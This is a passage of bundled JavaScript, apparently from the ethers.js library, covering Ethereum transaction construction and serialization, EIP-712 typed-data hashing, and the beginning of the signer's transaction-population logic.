          return BN_05;
        }
        return null;
      }
      return value;
    }
    set maxFeePerGas(value) {
      this.#maxFeePerGas = value == null ? null : getBigInt(value, "maxFeePerGas");
    }
    /**
     *  The transaction data. For ``init`` transactions this is the
     *  deployment code.
     */
    get data() {
      return this.#data;
    }
    set data(value) {
      this.#data = hexlify(value);
    }
    /**
     *  The amount of ether (in wei) to send in this transactions.
     */
    get value() {
      return this.#value;
    }
    set value(value) {
      this.#value = getBigInt(value, "value");
    }
    /**
     *  The chain ID this transaction is valid on.
     */
    get chainId() {
      return this.#chainId;
    }
    set chainId(value) {
      this.#chainId = getBigInt(value);
    }
    /**
     *  If signed, the signature for this transaction.
     */
    get signature() {
      return this.#sig || null;
    }
    set signature(value) {
      this.#sig = value == null ? null : Signature.from(value);
    }
    isValid() {
      const sig = this.signature;
      if (sig && !sig.isValid()) {
        return false;
      }
      const auths = this.authorizationList;
      if (auths) {
        for (const auth of auths) {
          if (!auth.signature.isValid()) {
            return false;
          }
        }
      }
      return true;
    }
    /**
     *  The access list.
     *
     *  An access list permits discounted (but pre-paid) access to
     *  bytecode and state variable access within contract execution.
     */
    get accessList() {
      const value = this.#accessList || null;
      if (value == null) {
        if (this.type === 1 || this.type === 2 || this.type === 3) {
          return [];
        }
        return null;
      }
      return value;
    }
    set accessList(value) {
      this.#accessList = value == null ? null : accessListify(value);
    }
    get authorizationList() {
      const value = this.#auths || null;
      if (value == null) {
        if (this.type === 4) {
          return [];
        }
      }
      return value;
    }
    set authorizationList(auths) {
      this.#auths = auths == null ? null : auths.map((a) => authorizationify(a));
    }
    /**
     *  The max fee per blob gas for Cancun transactions.
     */
    get maxFeePerBlobGas() {
      const value = this.#maxFeePerBlobGas;
      if (value == null && this.type === 3) {
        return BN_05;
      }
      return value;
    }
    set maxFeePerBlobGas(value) {
      this.#maxFeePerBlobGas = value == null ? null : getBigInt(value, "maxFeePerBlobGas");
    }
    /**
     *  The BLOb versioned hashes for Cancun transactions.
     */
    get blobVersionedHashes() {
      let value = this.#blobVersionedHashes;
      if (value == null && this.type === 3) {
        return [];
      }
      return value;
    }
    set blobVersionedHashes(value) {
      if (value != null) {
        assertArgument(Array.isArray(value), "blobVersionedHashes must be an Array", "value", value);
        value = value.slice();
        for (let i = 0; i < value.length; i++) {
          assertArgument(isHexString(value[i], 32), "invalid blobVersionedHash", `value[${i}]`, value[i]);
        }
      }
      this.#blobVersionedHashes = value;
    }
    /**
     *  The BLObs for the Transaction, if any.
     *
     *  If ``blobs`` is non-``null``, then the [[seriailized]]
     *  will return the network formatted sidecar, otherwise it
     *  will return the standard [[link-eip-2718]] payload. The
     *  [[unsignedSerialized]] is unaffected regardless.
     *
     *  When setting ``blobs``, either fully valid [[Blob]] objects
     *  may be specified (i.e. correctly padded, with correct
     *  committments and proofs) or a raw [[BytesLike]] may
     *  be provided.
     *
     *  If raw [[BytesLike]] are provided, the [[kzg]] property **must**
     *  be already set. The blob will be correctly padded and the
     *  [[KzgLibrary]] will be used to compute the committment and
     *  proof for the blob.
     *
     *  A BLOb is a sequence of field elements, each of which must
     *  be within the BLS field modulo, so some additional processing
     *  may be required to encode arbitrary data to ensure each 32 byte
     *  field is within the valid range.
     *
     *  Setting this automatically populates [[blobVersionedHashes]],
     *  overwriting any existing values. Setting this to ``null``
     *  does **not** remove the [[blobVersionedHashes]], leaving them
     *  present.
     */
    get blobs() {
      if (this.#blobs == null) {
        return null;
      }
      return this.#blobs.map((b) => Object.assign({}, b));
    }
    set blobs(_blobs) {
      if (_blobs == null) {
        this.#blobs = null;
        return;
      }
      const blobs = [];
      const versionedHashes = [];
      for (let i = 0; i < _blobs.length; i++) {
        const blob = _blobs[i];
        if (isBytesLike(blob)) {
          assert(this.#kzg, "adding a raw blob requires a KZG library", "UNSUPPORTED_OPERATION", {
            operation: "set blobs()"
          });
          let data = getBytes(blob);
          assertArgument(data.length <= BLOB_SIZE, "blob is too large", `blobs[${i}]`, blob);
          if (data.length !== BLOB_SIZE) {
            const padded = new Uint8Array(BLOB_SIZE);
            padded.set(data);
            data = padded;
          }
          const commit = this.#kzg.blobToKzgCommitment(data);
          const proof = hexlify(this.#kzg.computeBlobKzgProof(data, commit));
          blobs.push({
            data: hexlify(data),
            commitment: hexlify(commit),
            proof
          });
          versionedHashes.push(getVersionedHash(1, commit));
        } else {
          const data = hexlify(blob.data);
          const commitment = hexlify(blob.commitment);
          const proof = hexlify(blob.proof);
          blobs.push({ data, commitment, proof });
          versionedHashes.push(getVersionedHash(1, commitment));
        }
      }
      this.#blobs = blobs;
      this.#blobVersionedHashes = versionedHashes;
    }
    get kzg() {
      return this.#kzg;
    }
    set kzg(kzg) {
      if (kzg == null) {
        this.#kzg = null;
      } else {
        this.#kzg = getKzgLibrary(kzg);
      }
    }
    get blobWrapperVersion() {
      return this.#blobWrapperVersion;
    }
    set blobWrapperVersion(value) {
      this.#blobWrapperVersion = value;
    }
    /**
     *  Creates a new Transaction with default values.
     */
    constructor() {
      this.#type = null;
      this.#to = null;
      this.#nonce = 0;
      this.#gasLimit = BN_05;
      this.#gasPrice = null;
      this.#maxPriorityFeePerGas = null;
      this.#maxFeePerGas = null;
      this.#data = "0x";
      this.#value = BN_05;
      this.#chainId = BN_05;
      this.#sig = null;
      this.#accessList = null;
      this.#maxFeePerBlobGas = null;
      this.#blobVersionedHashes = null;
      this.#kzg = null;
      this.#blobs = null;
      this.#auths = null;
      this.#blobWrapperVersion = null;
    }
    /**
     *  The transaction hash, if signed. Otherwise, ``null``.
     */
    get hash() {
      if (this.signature == null) {
        return null;
      }
      return keccak256(this.#getSerialized(true, false));
    }
    /**
     *  The pre-image hash of this transaction.
     *
     *  This is the digest that a [[Signer]] must sign to authorize
     *  this transaction.
     */
    get unsignedHash() {
      return keccak256(this.unsignedSerialized);
    }
    /**
     *  The sending address, if signed. Otherwise, ``null``.
     */
    get from() {
      if (this.signature == null) {
        return null;
      }
      return recoverAddress(this.unsignedHash, this.signature.getCanonical());
    }
    /**
     *  The public key of the sender, if signed. Otherwise, ``null``.
     */
    get fromPublicKey() {
      if (this.signature == null) {
        return null;
      }
      return SigningKey.recoverPublicKey(this.unsignedHash, this.signature.getCanonical());
    }
    /**
     *  Returns true if signed.
     *
     *  This provides a Type Guard that properties requiring a signed
     *  transaction are non-null.
     */
    isSigned() {
      return this.signature != null;
    }
    #getSerialized(signed, sidecar) {
      assert(!signed || this.signature != null, "cannot serialize unsigned transaction; maybe you meant .unsignedSerialized", "UNSUPPORTED_OPERATION", { operation: ".serialized" });
      const sig = signed ? this.signature : null;
      switch (this.inferType()) {
        case 0:
          return _serializeLegacy(this, sig);
        case 1:
          return _serializeEip2930(this, sig);
        case 2:
          return _serializeEip1559(this, sig);
        case 3:
          return _serializeEip4844(this, sig, sidecar ? this.blobs : null);
        case 4:
          return _serializeEip7702(this, sig);
      }
      assert(false, "unsupported transaction type", "UNSUPPORTED_OPERATION", { operation: ".serialized" });
    }
    /**
     *  The serialized transaction.
     *
     *  This throws if the transaction is unsigned. For the pre-image,
     *  use [[unsignedSerialized]].
     */
    get serialized() {
      return this.#getSerialized(true, true);
    }
    /**
     *  The transaction pre-image.
     *
     *  The hash of this is the digest which needs to be signed to
     *  authorize this transaction.
     */
    get unsignedSerialized() {
      return this.#getSerialized(false, false);
    }
    /**
     *  Return the most "likely" type; currently the highest
     *  supported transaction type.
     */
    inferType() {
      const types = this.inferTypes();
      if (types.indexOf(2) >= 0) {
        return 2;
      }
      return types.pop();
    }
    /**
     *  Validates the explicit properties and returns a list of compatible
     *  transaction types.
     */
    inferTypes() {
      const hasGasPrice = this.gasPrice != null;
      const hasFee = this.maxFeePerGas != null || this.maxPriorityFeePerGas != null;
      const hasAccessList = this.accessList != null;
      const hasBlob = this.#maxFeePerBlobGas != null || this.#blobVersionedHashes;
      if (this.maxFeePerGas != null && this.maxPriorityFeePerGas != null) {
        assert(this.maxFeePerGas >= this.maxPriorityFeePerGas, "priorityFee cannot be more than maxFee", "BAD_DATA", { value: this });
      }
      assert(!hasFee || this.type !== 0 && this.type !== 1, "transaction type cannot have maxFeePerGas or maxPriorityFeePerGas", "BAD_DATA", { value: this });
      assert(this.type !== 0 || !hasAccessList, "legacy transaction cannot have accessList", "BAD_DATA", { value: this });
      const types = [];
      if (this.type != null) {
        types.push(this.type);
      } else {
        if (this.authorizationList && this.authorizationList.length) {
          types.push(4);
        } else if (hasFee) {
          types.push(2);
        } else if (hasGasPrice) {
          types.push(1);
          if (!hasAccessList) {
            types.push(0);
          }
        } else if (hasAccessList) {
          types.push(1);
          types.push(2);
        } else if (hasBlob && this.to) {
          types.push(3);
        } else {
          types.push(0);
          types.push(1);
          types.push(2);
          types.push(3);
        }
      }
      types.sort();
      return types;
    }
    /**
     *  Returns true if this transaction is a legacy transaction (i.e.
     *  ``type === 0``).
     *
     *  This provides a Type Guard that the related properties are
     *  non-null.
     */
    isLegacy() {
      return this.type === 0;
    }
    /**
     *  Returns true if this transaction is berlin hardform transaction (i.e.
     *  ``type === 1``).
     *
     *  This provides a Type Guard that the related properties are
     *  non-null.
     */
    isBerlin() {
      return this.type === 1;
    }
    /**
     *  Returns true if this transaction is london hardform transaction (i.e.
     *  ``type === 2``).
     *
     *  This provides a Type Guard that the related properties are
     *  non-null.
     */
    isLondon() {
      return this.type === 2;
    }
    /**
     *  Returns true if this transaction is an [[link-eip-4844]] BLOB
     *  transaction.
     *
     *  This provides a Type Guard that the related properties are
     *  non-null.
     */
    isCancun() {
      return this.type === 3;
    }
    /**
     *  Create a copy of this transaciton.
     */
    clone() {
      return _Transaction.from(this);
    }
    /**
     *  Return a JSON-friendly object.
     */
    toJSON() {
      const s = (v) => {
        if (v == null) {
          return null;
        }
        return v.toString();
      };
      return {
        type: this.type,
        to: this.to,
        //            from: this.from,
        data: this.data,
        nonce: this.nonce,
        gasLimit: s(this.gasLimit),
        gasPrice: s(this.gasPrice),
        maxPriorityFeePerGas: s(this.maxPriorityFeePerGas),
        maxFeePerGas: s(this.maxFeePerGas),
        value: s(this.value),
        chainId: s(this.chainId),
        sig: this.signature ? this.signature.toJSON() : null,
        accessList: this.accessList
      };
    }
    [inspect2]() {
      return this.toString();
    }
    toString() {
      const output2 = [];
      const add2 = (key) => {
        let value = this[key];
        if (typeof value === "string") {
          value = JSON.stringify(value);
        }
        output2.push(`${key}: ${value}`);
      };
      if (this.type) {
        add2("type");
      }
      add2("to");
      add2("data");
      add2("nonce");
      add2("gasLimit");
      add2("value");
      if (this.chainId != null) {
        add2("chainId");
      }
      if (this.signature) {
        add2("from");
        output2.push(`signature: ${this.signature.toString()}`);
      }
      const auths = this.authorizationList;
      if (auths) {
        const outputAuths = [];
        for (const auth of auths) {
          const o = [];
          o.push(`address: ${JSON.stringify(auth.address)}`);
          if (auth.nonce != null) {
            o.push(`nonce: ${auth.nonce}`);
          }
          if (auth.chainId != null) {
            o.push(`chainId: ${auth.chainId}`);
          }
          if (auth.signature) {
            o.push(`signature: ${auth.signature.toString()}`);
          }
          outputAuths.push(`Authorization { ${o.join(", ")} }`);
        }
        output2.push(`authorizations: [ ${outputAuths.join(", ")} ]`);
      }
      return `Transaction { ${output2.join(", ")} }`;
    }
    /**
     *  Create a **Transaction** from a serialized transaction or a
     *  Transaction-like object.
     */
    static from(tx) {
      if (tx == null) {
        return new _Transaction();
      }
      if (typeof tx === "string") {
        const payload = getBytes(tx);
        if (payload[0] >= 127) {
          return _Transaction.from(_parseLegacy(payload));
        }
        switch (payload[0]) {
          case 1:
            return _Transaction.from(_parseEip2930(payload));
          case 2:
            return _Transaction.from(_parseEip1559(payload));
          case 3:
            return _Transaction.from(_parseEip4844(payload));
          case 4:
            return _Transaction.from(_parseEip7702(payload));
        }
        assert(false, "unsupported transaction type", "UNSUPPORTED_OPERATION", { operation: "from" });
      }
      const result = new _Transaction();
      if (tx.type != null) {
        result.type = tx.type;
      }
      if (tx.to != null) {
        result.to = tx.to;
      }
      if (tx.nonce != null) {
        result.nonce = tx.nonce;
      }
      if (tx.gasLimit != null) {
        result.gasLimit = tx.gasLimit;
      }
      if (tx.gasPrice != null) {
        result.gasPrice = tx.gasPrice;
      }
      if (tx.maxPriorityFeePerGas != null) {
        result.maxPriorityFeePerGas = tx.maxPriorityFeePerGas;
      }
      if (tx.maxFeePerGas != null) {
        result.maxFeePerGas = tx.maxFeePerGas;
      }
      if (tx.maxFeePerBlobGas != null) {
        result.maxFeePerBlobGas = tx.maxFeePerBlobGas;
      }
      if (tx.data != null) {
        result.data = tx.data;
      }
      if (tx.value != null) {
        result.value = tx.value;
      }
      if (tx.chainId != null) {
        result.chainId = tx.chainId;
      }
      if (tx.signature != null) {
        result.signature = Signature.from(tx.signature);
      }
      if (tx.accessList != null) {
        result.accessList = tx.accessList;
      }
      if (tx.authorizationList != null) {
        result.authorizationList = tx.authorizationList;
      }
      if (tx.blobVersionedHashes != null) {
        result.blobVersionedHashes = tx.blobVersionedHashes;
      }
      if (tx.kzg != null) {
        result.kzg = tx.kzg;
      }
      if (tx.blobWrapperVersion != null) {
        result.blobWrapperVersion = tx.blobWrapperVersion;
      }
      if (tx.blobs != null) {
        result.blobs = tx.blobs;
      }
      if (tx.hash != null) {
        assertArgument(result.isSigned(), "unsigned transaction cannot define '.hash'", "tx", tx);
        assertArgument(result.hash === tx.hash, "hash mismatch", "tx", tx);
      }
      if (tx.from != null) {
        assertArgument(result.isSigned(), "unsigned transaction cannot define '.from'", "tx", tx);
        assertArgument(result.from.toLowerCase() === (tx.from || "").toLowerCase(), "from mismatch", "tx", tx);
      }
      return result;
    }
  };

  // node_modules/ethers/lib.esm/hash/authorization.js
  function hashAuthorization(auth) {
    assertArgument(typeof auth.address === "string", "invalid address for hashAuthorization", "auth.address", auth);
    return keccak256(concat([
      "0x05",
      encodeRlp([
        auth.chainId != null ? toBeArray(auth.chainId) : "0x",
        getAddress(auth.address),
        auth.nonce != null ? toBeArray(auth.nonce) : "0x"
      ])
    ]));
  }

  // node_modules/ethers/lib.esm/hash/id.js
  function id(value) {
    return keccak256(toUtf8Bytes(value));
  }

  // node_modules/ethers/lib.esm/hash/message.js
  function hashMessage(message) {
    if (typeof message === "string") {
      message = toUtf8Bytes(message);
    }
    return keccak256(concat([
      toUtf8Bytes(MessagePrefix),
      toUtf8Bytes(String(message.length)),
      message
    ]));
  }

  // node_modules/ethers/lib.esm/hash/typed-data.js
  var padding = new Uint8Array(32);
  padding.fill(0);
  var BN__1 = BigInt(-1);
  var BN_06 = BigInt(0);
  var BN_13 = BigInt(1);
  var BN_MAX_UINT256 = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
  function hexPadRight(value) {
    const bytes2 = getBytes(value);
    const padOffset = bytes2.length % 32;
    if (padOffset) {
      return concat([bytes2, padding.slice(padOffset)]);
    }
    return hexlify(bytes2);
  }
  var hexTrue = toBeHex(BN_13, 32);
  var hexFalse = toBeHex(BN_06, 32);
  var domainFieldTypes = {
    name: "string",
    version: "string",
    chainId: "uint256",
    verifyingContract: "address",
    salt: "bytes32"
  };
  var domainFieldNames = [
    "name",
    "version",
    "chainId",
    "verifyingContract",
    "salt"
  ];
  function checkString(key) {
    return function(value) {
      assertArgument(typeof value === "string", `invalid domain value for ${JSON.stringify(key)}`, `domain.${key}`, value);
      return value;
    };
  }
  var domainChecks = {
    name: checkString("name"),
    version: checkString("version"),
    chainId: function(_value) {
      const value = getBigInt(_value, "domain.chainId");
      assertArgument(value >= 0, "invalid chain ID", "domain.chainId", _value);
      if (Number.isSafeInteger(value)) {
        return Number(value);
      }
      return toQuantity(value);
    },
    verifyingContract: function(value) {
      try {
        return getAddress(value).toLowerCase();
      } catch (error) {
      }
      assertArgument(false, `invalid domain value "verifyingContract"`, "domain.verifyingContract", value);
    },
    salt: function(value) {
      const bytes2 = getBytes(value, "domain.salt");
      assertArgument(bytes2.length === 32, `invalid domain value "salt"`, "domain.salt", value);
      return hexlify(bytes2);
    }
  };
  function getBaseEncoder(type) {
    {
      const match = type.match(/^(u?)int(\d+)$/);
      if (match) {
        const signed = match[1] === "";
        const width = parseInt(match[2]);
        assertArgument(width % 8 === 0 && width !== 0 && width <= 256 && match[2] === String(width), "invalid numeric width", "type", type);
        const boundsUpper = mask(BN_MAX_UINT256, signed ? width - 1 : width);
        const boundsLower = signed ? (boundsUpper + BN_13) * BN__1 : BN_06;
        return function(_value) {
          const value = getBigInt(_value, "value");
          assertArgument(value >= boundsLower && value <= boundsUpper, `value out-of-bounds for ${type}`, "value", value);
          return toBeHex(signed ? toTwos(value, 256) : value, 32);
        };
      }
    }
    {
      const match = type.match(/^bytes(\d+)$/);
      if (match) {
        const width = parseInt(match[1]);
        assertArgument(width !== 0 && width <= 32 && match[1] === String(width), "invalid bytes width", "type", type);
        return function(value) {
          const bytes2 = getBytes(value);
          assertArgument(bytes2.length === width, `invalid length for ${type}`, "value", value);
          return hexPadRight(value);
        };
      }
    }
    switch (type) {
      case "address":
        return function(value) {
          return zeroPadValue(getAddress(value), 32);
        };
      case "bool":
        return function(value) {
          return !value ? hexFalse : hexTrue;
        };
      case "bytes":
        return function(value) {
          return keccak256(value);
        };
      case "string":
        return function(value) {
          return id(value);
        };
    }
    return null;
  }
  function encodeType(name, fields) {
    return `${name}(${fields.map(({ name: name2, type }) => type + " " + name2).join(",")})`;
  }
  function splitArray(type) {
    const match = type.match(/^([^\x5b]*)((\x5b\d*\x5d)*)(\x5b(\d*)\x5d)$/);
    if (match) {
      return {
        base: match[1],
        index: match[2] + match[4],
        array: {
          base: match[1],
          prefix: match[1] + match[2],
          count: match[5] ? parseInt(match[5]) : -1
        }
      };
    }
    return { base: type };
  }
  var TypedDataEncoder = class _TypedDataEncoder {
    /**
     *  The primary type for the structured [[types]].
     *
     *  This is derived automatically from the [[types]], since no
     *  recursion is possible, once the DAG for the types is consturcted
     *  internally, the primary type must be the only remaining type with
     *  no parent nodes.
     */
    primaryType;
    #types;
    /**
     *  The types.
     */
    get types() {
      return JSON.parse(this.#types);
    }
    #fullTypes;
    #encoderCache;
    /**
     *  Create a new **TypedDataEncoder** for %%types%%.
     *
     *  This performs all necessary checking that types are valid and
     *  do not violate the [[link-eip-712]] structural constraints as
     *  well as computes the [[primaryType]].
     */
    constructor(_types) {
      this.#fullTypes = /* @__PURE__ */ new Map();
      this.#encoderCache = /* @__PURE__ */ new Map();
      const links = /* @__PURE__ */ new Map();
      const parents = /* @__PURE__ */ new Map();
      const subtypes = /* @__PURE__ */ new Map();
      const types = {};
      Object.keys(_types).forEach((type) => {
        types[type] = _types[type].map(({ name, type: type2 }) => {
          let { base, index } = splitArray(type2);
          if (base === "int" && !_types["int"]) {
            base = "int256";
          }
          if (base === "uint" && !_types["uint"]) {
            base = "uint256";
          }
          return { name, type: base + (index || "") };
        });
        links.set(type, /* @__PURE__ */ new Set());
        parents.set(type, []);
        subtypes.set(type, /* @__PURE__ */ new Set());
      });
      this.#types = JSON.stringify(types);
      for (const name in types) {
        const uniqueNames = /* @__PURE__ */ new Set();
        for (const field of types[name]) {
          assertArgument(!uniqueNames.has(field.name), `duplicate variable name ${JSON.stringify(field.name)} in ${JSON.stringify(name)}`, "types", _types);
          uniqueNames.add(field.name);
          const baseType = splitArray(field.type).base;
          assertArgument(baseType !== name, `circular type reference to ${JSON.stringify(baseType)}`, "types", _types);
          const encoder = getBaseEncoder(baseType);
          if (encoder) {
            continue;
          }
          assertArgument(parents.has(baseType), `unknown type ${JSON.stringify(baseType)}`, "types", _types);
          parents.get(baseType).push(name);
          links.get(name).add(baseType);
        }
      }
      const primaryTypes = Array.from(parents.keys()).filter((n) => parents.get(n).length === 0);
      assertArgument(primaryTypes.length !== 0, "missing primary type", "types", _types);
      assertArgument(primaryTypes.length === 1, `ambiguous primary types or unused types: ${primaryTypes.map((t) => JSON.stringify(t)).join(", ")}`, "types", _types);
      defineProperties(this, { primaryType: primaryTypes[0] });
      function checkCircular(type, found) {
        assertArgument(!found.has(type), `circular type reference to ${JSON.stringify(type)}`, "types", _types);
        found.add(type);
        for (const child of links.get(type)) {
          if (!parents.has(child)) {
            continue;
          }
          checkCircular(child, found);
          for (const subtype of found) {
            subtypes.get(subtype).add(child);
          }
        }
        found.delete(type);
      }
      checkCircular(this.primaryType, /* @__PURE__ */ new Set());
      for (const [name, set] of subtypes) {
        const st = Array.from(set);
        st.sort();
        this.#fullTypes.set(name, encodeType(name, types[name]) + st.map((t) => encodeType(t, types[t])).join(""));
      }
    }
    /**
     *  Returnthe encoder for the specific %%type%%.
     */
    getEncoder(type) {
      let encoder = this.#encoderCache.get(type);
      if (!encoder) {
        encoder = this.#getEncoder(type);
        this.#encoderCache.set(type, encoder);
      }
      return encoder;
    }
    #getEncoder(type) {
      {
        const encoder = getBaseEncoder(type);
        if (encoder) {
          return encoder;
        }
      }
      const array = splitArray(type).array;
      if (array) {
        const subtype = array.prefix;
        const subEncoder = this.getEncoder(subtype);
        return (value) => {
          assertArgument(array.count === -1 || array.count === value.length, `array length mismatch; expected length ${array.count}`, "value", value);
          let result = value.map(subEncoder);
          if (this.#fullTypes.has(subtype)) {
            result = result.map(keccak256);
          }
          return keccak256(concat(result));
        };
      }
      const fields = this.types[type];
      if (fields) {
        const encodedType = id(this.#fullTypes.get(type));
        return (value) => {
          const values = fields.map(({ name, type: type2 }) => {
            const result = this.getEncoder(type2)(value[name]);
            if (this.#fullTypes.has(type2)) {
              return keccak256(result);
            }
            return result;
          });
          values.unshift(encodedType);
          return concat(values);
        };
      }
      assertArgument(false, `unknown type: ${type}`, "type", type);
    }
    /**
     *  Return the full type for %%name%%.
     */
    encodeType(name) {
      const result = this.#fullTypes.get(name);
      assertArgument(result, `unknown type: ${JSON.stringify(name)}`, "name", name);
      return result;
    }
    /**
     *  Return the encoded %%value%% for the %%type%%.
     */
    encodeData(type, value) {
      return this.getEncoder(type)(value);
    }
    /**
     *  Returns the hash of %%value%% for the type of %%name%%.
     */
    hashStruct(name, value) {
      return keccak256(this.encodeData(name, value));
    }
    /**
     *  Return the fulled encoded %%value%% for the [[types]].
     */
    encode(value) {
      return this.encodeData(this.primaryType, value);
    }
    /**
     *  Return the hash of the fully encoded %%value%% for the [[types]].
     */
    hash(value) {
      return this.hashStruct(this.primaryType, value);
    }
    /**
     *  @_ignore:
     */
    _visit(type, value, callback) {
      {
        const encoder = getBaseEncoder(type);
        if (encoder) {
          return callback(type, value);
        }
      }
      const array = splitArray(type).array;
      if (array) {
        assertArgument(array.count === -1 || array.count === value.length, `array length mismatch; expected length ${array.count}`, "value", value);
        return value.map((v) => this._visit(array.prefix, v, callback));
      }
      const fields = this.types[type];
      if (fields) {
        return fields.reduce((accum, { name, type: type2 }) => {
          accum[name] = this._visit(type2, value[name], callback);
          return accum;
        }, {});
      }
      assertArgument(false, `unknown type: ${type}`, "type", type);
    }
    /**
     *  Call %%calback%% for each value in %%value%%, passing the type and
     *  component within %%value%%.
     *
     *  This is useful for replacing addresses or other transformation that
     *  may be desired on each component, based on its type.
     */
    visit(value, callback) {
      return this._visit(this.primaryType, value, callback);
    }
    /**
     *  Create a new **TypedDataEncoder** for %%types%%.
     */
    static from(types) {
      return new _TypedDataEncoder(types);
    }
    /**
     *  Return the primary type for %%types%%.
     */
    static getPrimaryType(types) {
      return _TypedDataEncoder.from(types).primaryType;
    }
    /**
     *  Return the hashed struct for %%value%% using %%types%% and %%name%%.
     */
    static hashStruct(name, types, value) {
      return _TypedDataEncoder.from(types).hashStruct(name, value);
    }
    /**
     *  Return the domain hash for %%domain%%.
     */
    static hashDomain(domain) {
      const domainFields = [];
      for (const name in domain) {
        if (domain[name] == null) {
          continue;
        }
        const type = domainFieldTypes[name];
        assertArgument(type, `invalid typed-data domain key: ${JSON.stringify(name)}`, "domain", domain);
        domainFields.push({ name, type });
      }
      domainFields.sort((a, b) => {
        return domainFieldNames.indexOf(a.name) - domainFieldNames.indexOf(b.name);
      });
      return _TypedDataEncoder.hashStruct("EIP712Domain", { EIP712Domain: domainFields }, domain);
    }
    /**
     *  Return the fully encoded [[link-eip-712]] %%value%% for %%types%% with %%domain%%.
     */
    static encode(domain, types, value) {
      return concat([
        "0x1901",
        _TypedDataEncoder.hashDomain(domain),
        _TypedDataEncoder.from(types).hash(value)
      ]);
    }
    /**
     *  Return the hash of the fully encoded [[link-eip-712]] %%value%% for %%types%% with %%domain%%.
     */
    static hash(domain, types, value) {
      return keccak256(_TypedDataEncoder.encode(domain, types, value));
    }
    // Replaces all address types with ENS names with their looked up address
    /**
     * Resolves to the value from resolving all addresses in %%value%% for
     * %%types%% and the %%domain%%.
     */
    static async resolveNames(domain, types, value, resolveName) {
      domain = Object.assign({}, domain);
      for (const key in domain) {
        if (domain[key] == null) {
          delete domain[key];
        }
      }
      const ensCache = {};
      if (domain.verifyingContract && !isHexString(domain.verifyingContract, 20)) {
        ensCache[domain.verifyingContract] = "0x";
      }
      const encoder = _TypedDataEncoder.from(types);
      encoder.visit(value, (type, value2) => {
        if (type === "address" && !isHexString(value2, 20)) {
          ensCache[value2] = "0x";
        }
        return value2;
      });
      for (const name in ensCache) {
        ensCache[name] = await resolveName(name);
      }
      if (domain.verifyingContract && ensCache[domain.verifyingContract]) {
        domain.verifyingContract = ensCache[domain.verifyingContract];
      }
      value = encoder.visit(value, (type, value2) => {
        if (type === "address" && ensCache[value2]) {
          return ensCache[value2];
        }
        return value2;
      });
      return { domain, value };
    }
    /**
     *  Returns the JSON-encoded payload expected by nodes which implement
     *  the JSON-RPC [[link-eip-712]] method.
     */
    static getPayload(domain, types, value) {
      _TypedDataEncoder.hashDomain(domain);
      const domainValues = {};
      const domainTypes = [];
      domainFieldNames.forEach((name) => {
        const value2 = domain[name];
        if (value2 == null) {
          return;
        }
        domainValues[name] = domainChecks[name](value2);
        domainTypes.push({ name, type: domainFieldTypes[name] });
      });
      const encoder = _TypedDataEncoder.from(types);
      types = encoder.types;
      const typesWithDomain = Object.assign({}, types);
      assertArgument(typesWithDomain.EIP712Domain == null, "types must not contain EIP712Domain type", "types.EIP712Domain", types);
      typesWithDomain.EIP712Domain = domainTypes;
      encoder.encode(value);
      return {
        types: typesWithDomain,
        domain: domainValues,
        primaryType: encoder.primaryType,
        message: encoder.visit(value, (type, value2) => {
          if (type.match(/^bytes(\d*)/)) {
            return hexlify(getBytes(value2));
          }
          if (type.match(/^u?int/)) {
            return getBigInt(value2).toString();
          }
          switch (type) {
            case "address":
              return value2.toLowerCase();
            case "bool":
              return !!value2;
            case "string":
              assertArgument(typeof value2 === "string", "invalid string", "value", value2);
              return value2;
          }
          assertArgument(false, "unsupported type", "type", type);
        })
      };
    }
  };

  // node_modules/ethers/lib.esm/providers/provider.js
  var BN_07 = BigInt(0);
  function copyRequest(req) {
    const result = {};
    if (req.to) {
      result.to = req.to;
    }
    if (req.from) {
      result.from = req.from;
    }
    if (req.data) {
      result.data = hexlify(req.data);
    }
    const bigIntKeys = "chainId,gasLimit,gasPrice,maxFeePerBlobGas,maxFeePerGas,maxPriorityFeePerGas,value".split(/,/);
    for (const key of bigIntKeys) {
      if (!(key in req) || req[key] == null) {
        continue;
      }
      result[key] = getBigInt(req[key], `request.${key}`);
    }
    const numberKeys = "type,nonce".split(/,/);
    for (const key of numberKeys) {
      if (!(key in req) || req[key] == null) {
        continue;
      }
      result[key] = getNumber(req[key], `request.${key}`);
    }
    if (req.accessList) {
      result.accessList = accessListify(req.accessList);
    }
    if (req.authorizationList) {
      result.authorizationList = req.authorizationList.slice();
    }
    if ("blockTag" in req) {
      result.blockTag = req.blockTag;
    }
    if ("enableCcipRead" in req) {
      result.enableCcipRead = !!req.enableCcipRead;
    }
    if ("customData" in req) {
      result.customData = req.customData;
    }
    if ("blobVersionedHashes" in req && req.blobVersionedHashes) {
      result.blobVersionedHashes = req.blobVersionedHashes.slice();
    }
    if ("kzg" in req) {
      result.kzg = req.kzg;
    }
    if ("blobWrapperVersion" in req) {
      result.blobWrapperVersion = req.blobWrapperVersion;
    }
    if ("blobs" in req && req.blobs) {
      result.blobs = req.blobs.map((b) => {
        if (isBytesLike(b)) {
          return hexlify(b);
        }
        return Object.assign({}, b);
      });
    }
    return result;
  }

  // node_modules/ethers/lib.esm/providers/abstract-signer.js
  function checkProvider(signer, operation) {
    if (signer.provider) {
      return signer.provider;
    }
    assert(false, "missing provider", "UNSUPPORTED_OPERATION", { operation });
  }
  async function populate(signer, tx) {
    let pop = copyRequest(tx);
    if (pop.to != null) {
      pop.to = resolveAddress(pop.to, signer);
    }
    if (pop.from != null) {
      const from = pop.from;
      pop.from = Promise.all([
        signer.getAddress(),
        resolveAddress(from, signer)
      ]).then(([address, from2]) => {
        assertArgument(address.toLowerCase() === from2.toLowerCase(), "transaction from mismatch", "tx.from", from2);
        return address;
      });
    } else {
      pop.from = signer.getAddress();
    }
    return await resolveProperties(pop);
  }
  var AbstractSigner = class {
    /**
     *  The provider this signer is connected to.
     */
    provider;
    /**
     *  Creates a new Signer connected to %%provider%%.
     */
    constructor(provider) {
      defineProperties(this, { provider: provider || null });
    }
    async getNonce(blockTag) {
      return checkProvider(this, "getTransactionCount").getTransactionCount(await this.getAddress(), blockTag);
    }
    async populateCall(tx) {
      const pop = await populate(this, tx);
      return pop;
    }
    async populateTransaction(tx) {
      const provider = checkProvider(this, "populateTransaction");
      const pop = await populate(this, tx);
      if (pop.nonce == null) {
        pop.nonce = await this.getNonce("pending");
      }
      if (pop.gasLimit == null) {
        pop.gasLimit = await this.estimateGas(pop);
      }
      const network = await this.provider.getNetwork();
      if (pop.chainId != null) {
        const chainId = getBigInt(pop.chainId);
        assertArgument(chainId === network.chainId, "transaction chainId mismatch", "tx.chainId", tx.chainId);
      } else {
